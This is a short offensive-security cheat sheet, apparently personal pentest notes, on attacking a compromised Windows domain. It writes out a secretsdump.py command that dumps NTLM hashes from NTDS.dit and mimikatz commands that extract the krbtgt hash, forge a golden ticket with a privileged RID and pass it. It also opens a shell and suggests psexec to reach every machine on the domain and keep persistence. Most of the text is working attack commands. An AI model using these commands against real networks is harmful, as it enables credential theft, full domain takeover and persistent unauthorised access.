# Additional Compromised System Stratgies

- Dumping the NTDS.dit file

```jsx
secretsdump.py DOMAIN/USERNAME:'PASSWORD'@IPADDRESS -just-dc-ntlm
```

- Golden Ticket Overview

We can get the Golden Ticket by compromising the krbtgt account. With a golden ticket we can request access to every machine on the entire domain. This can be done through mimikatz. 

[Mimikatz](Mimikatz%2024baf343c597414582beba9f59228d4e.md)

```jsx
lsadump::lsa /inject /name:krbtgt
```

- Things needed from this command to complete the golden ticket attack
    - Domain SID
    - NTLM hash of krbtgt account

Once collected we can run the next command in mimikatz.

```jsx
kerberos::golden /User:CANBEANYTHINGEVENFAKEUSER /domain:DOMAIN /sid:SID /krbtgt:NTLMHASH /id:500 /ptt
```

id:500 means RID 500 for privileged user

Ptt means pass the ticket

Next step is to run the command below to get into a shell

```jsx
misc::cmd
```

Once in a shell you can download psexec.exe and gain shell access to ANY system on the domain because you are the ticketing system. 

A golden ticket is a key way to keep persistence if you have owned a domain controller.